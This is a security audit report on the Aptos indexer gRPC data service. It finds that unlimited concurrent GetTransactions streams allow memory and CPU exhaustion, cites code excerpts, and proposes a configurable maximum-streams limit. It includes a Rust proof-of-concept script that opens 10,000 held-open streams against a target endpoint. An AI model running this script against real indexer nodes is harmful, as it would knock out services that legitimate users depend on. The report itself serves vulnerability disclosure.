# Audit Report

## Title
Unbounded Active Stream Creation Leads to Resource Exhaustion in Indexer gRPC Service

## Summary
The Aptos indexer gRPC data service allows unlimited concurrent stream creation without any bounds checking, enabling attackers to exhaust server memory, CPU, and network resources through a simple DoS attack. The `active_streams` field in `StreamInfo` is unbounded, and no maximum limit is enforced when clients open new `GetTransactions` streams.

## Finding Description

The vulnerability exists in the indexer gRPC data service's stream management system. When a client calls the `GetTransactions` RPC endpoint, the service creates a new active stream entry without checking the current number of active streams.

**Vulnerable Code Path:**

1. The `StreamInfo` struct contains an unbounded vector of active streams: [1](#0-0) 

2. The `ConnectionManager` stores active streams in a `DashMap` with no size limit: [2](#0-1) 

3. The `insert_active_stream` method performs NO bounds checking before inserting: [3](#0-2) 

4. Each `GetTransactions` request spawns a new async task that calls `start_streaming`: [4](#0-3) 

5. `start_streaming` immediately inserts the stream without validation: [5](#0-4) 

6. All active streams are collected and sent in every heartbeat: [6](#0-5) 

**Attack Scenario:**
1. Attacker opens 10,000+ concurrent `GetTransactions` gRPC streams
2. Each stream consumes:
   - Memory in the `DashMap` (String ID + `ActiveStream` struct + `StreamProgressSamples`)
   - CPU for the spawned async task
   - Memory for VecDeques storing up to 120 progress samples per stream
3. Every heartbeat (every 1 second) serializes and sends ALL active streams to the gRPC manager
4. Server runs out of memory or becomes unresponsive
5. Legitimate indexer clients cannot access transaction data

This breaks the **Resource Limits** invariant (#9) which requires all operations to respect computational and memory limits.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program for the following reasons:

1. **Validator Node Slowdowns**: If validators run indexer services, the attack directly impacts validator performance through memory exhaustion and CPU contention from thousands of spawned tasks.

2. **API Crashes**: The indexer gRPC service will become unresponsive or crash when memory is exhausted, affecting all downstream applications relying on blockchain data.

3. **Network Resource Exhaustion**: The heartbeat mechanism amplifies the attack - with 10,000 streams, each 1-second heartbeat serializes and transmits data for all 10,000 streams, consuming significant bandwidth.

The configuration shows no protection mechanisms: [7](#0-6) 

The `IndexerGrpcDataServiceConfig` contains no `max_concurrent_streams` or similar limit configuration.

## Likelihood Explanation

**Likelihood: HIGH**

This attack is trivially exploitable:
- No authentication required beyond normal gRPC access
- No special permissions needed
- Attack can be executed with a simple script opening multiple concurrent streams
- The gRPC endpoint is publicly accessible on indexer nodes
- No rate limiting exists at the service level
- The channel buffer for handling requests is only size 10, but requests are processed immediately: [8](#0-7) 

An attacker can easily create thousands of streams using standard gRPC client libraries in any language, with minimal code and resources on their side.

## Recommendation

Implement a maximum concurrent streams limit with proper enforcement:

```rust
// In connection_manager.rs
const MAX_ACTIVE_STREAMS: usize = 1000; // Configurable value

pub(crate) fn insert_active_stream(
    &self,
    id: &str,
    start_version: u64,
    end_version: Option<u64>,
) -> Result<(), &'static str> {
    // Check current stream count
    if self.active_streams.len() >= MAX_ACTIVE_STREAMS {
        return Err("Maximum concurrent streams exceeded");
    }
    
    self.active_streams.insert(
        id.to_owned(),
        (
            ActiveStream {
                id: id.to_owned(),
                start_time: Some(timestamp_now_proto()),
                start_version,
                end_version,
                progress: None,
            },
            StreamProgressSamples::new(),
        ),
    );
    let label = if self.is_live_data_service {
        ["live_data_service"]
    } else {
        ["historical_data_service"]
    };
    NUM_CONNECTED_STREAMS.with_label_values(&label).inc();
    Ok(())
}
```

Add configuration parameter:
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct IndexerGrpcDataServiceConfig {
    // ... existing fields ...
    #[serde(default = "IndexerGrpcDataServiceConfig::default_max_concurrent_streams")]
    pub max_concurrent_streams: usize,
}

impl IndexerGrpcDataServiceConfig {
    const fn default_max_concurrent_streams() -> usize {
        1000 // Reasonable default
    }
}
```

Handle rejection in the stream handlers to return proper gRPC error status.

## Proof of Concept

```rust
// PoC: Resource Exhaustion via Unlimited Stream Creation
// Compile and run against an Aptos indexer gRPC endpoint

use aptos_protos::indexer::v1::{
    raw_data_client::RawDataClient, GetTransactionsRequest
};
use tonic::Request;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let endpoint = "http://indexer.example.com:50051"; // Target indexer
    let num_streams = 10000; // Number of streams to create
    
    println!("Opening {} concurrent streams...", num_streams);
    
    let mut handles = vec![];
    
    for i in 0..num_streams {
        let endpoint = endpoint.to_string();
        let handle = tokio::spawn(async move {
            // Create new client for each stream
            let mut client = RawDataClient::connect(endpoint)
                .await
                .expect("Failed to connect");
            
            // Open stream and keep it alive
            let request = Request::new(GetTransactionsRequest {
                starting_version: Some(0),
                transactions_count: None, // Infinite stream
                batch_size: Some(1),
                transaction_filter: None,
            });
            
            let mut stream = client.get_transactions(request)
                .await
                .expect("Failed to open stream")
                .into_inner();
            
            println!("Stream {} opened", i);
            
            // Keep stream alive without consuming
            tokio::time::sleep(tokio::time::Duration::from_secs(3600)).await;
        });
        
        handles.push(handle);
        
        // Small delay to avoid overwhelming connection establishment
        tokio::time::sleep(tokio::time::Duration::from_millis(10)).await;
    }
    
    println!("All {} streams created. Server should now be experiencing resource exhaustion.", num_streams);
    println!("Monitoring memory usage on target server will show unbounded growth.");
    
    // Wait for all streams
    for handle in handles {
        let _ = handle.await;
    }
    
    Ok(())
}
```

**Expected Result**: The target indexer service will experience memory exhaustion as the `DashMap` grows unbounded, spawned tasks accumulate, and heartbeats attempt to serialize thousands of active streams. The service will eventually become unresponsive or crash.

**Notes**

This vulnerability affects the indexer gRPC infrastructure which is critical for ecosystem applications to access blockchain data. While not directly impacting consensus, if validators operate indexer services (common in practice), this can degrade validator performance. The fix requires adding configurable limits on concurrent streams with proper enforcement and error handling.

### Citations

**File:** protos/rust/src/pb/aptos.indexer.v1.rs (L189-193)
```rust
#[derive(Clone, PartialEq, ::prost::Message)]
pub struct StreamInfo {
    #[prost(message, repeated, tag="1")]
    pub active_streams: ::prost::alloc::vec::Vec<ActiveStream>,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L101-108)
```rust
pub(crate) struct ConnectionManager {
    chain_id: u64,
    grpc_manager_connections: DashMap<String, GrpcManagerClient<Channel>>,
    self_advertised_address: String,
    known_latest_version: AtomicU64,
    active_streams: DashMap<String, (ActiveStream, StreamProgressSamples)>,
    is_live_data_service: bool,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L190-215)
```rust
    pub(crate) fn insert_active_stream(
        &self,
        id: &str,
        start_version: u64,
        end_version: Option<u64>,
    ) {
        self.active_streams.insert(
            id.to_owned(),
            (
                ActiveStream {
                    id: id.to_owned(),
                    start_time: Some(timestamp_now_proto()),
                    start_version,
                    end_version,
                    progress: None,
                },
                StreamProgressSamples::new(),
            ),
        );
        let label = if self.is_live_data_service {
            ["live_data_service"]
        } else {
            ["historical_data_service"]
        };
        NUM_CONNECTED_STREAMS.with_label_values(&label).inc();
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L249-256)
```rust
    async fn heartbeat(&self, address: &str) -> Result<(), tonic::Status> {
        info!("Sending heartbeat to GrpcManager {address}.");
        let timestamp = Some(timestamp_now_proto());
        let known_latest_version = Some(self.known_latest_version());
        let stream_info = Some(StreamInfo {
            active_streams: self.get_active_streams(),
        });

```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L166-168)
```rust
        info!(stream_id = id, "Start streaming, starting_version: {starting_version}, ending_version: {ending_version:?}.");
        self.connection_manager
            .insert_active_stream(&id, starting_version, ending_version);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L83-96)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
#[serde(deny_unknown_fields)]
pub struct IndexerGrpcDataServiceConfig {
    pub(crate) chain_id: u64,
    pub(crate) service_config: ServiceConfig,
    pub(crate) live_data_service_config: LiveDataServiceConfig,
    pub(crate) historical_data_service_config: HistoricalDataServiceConfig,
    pub(crate) grpc_manager_addresses: Vec<String>,
    pub(crate) self_advertised_address: String,
    #[serde(default = "IndexerGrpcDataServiceConfig::default_max_transaction_filter_size_bytes")]
    pub(crate) max_transaction_filter_size_bytes: usize,
    #[serde(default = "IndexerGrpcDataServiceConfig::default_data_service_response_channel_size")]
    pub data_service_response_channel_size: usize,
}
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/config.rs (L123-123)
```rust
        let (handler_tx, handler_rx) = tokio::sync::mpsc::channel(10);
```
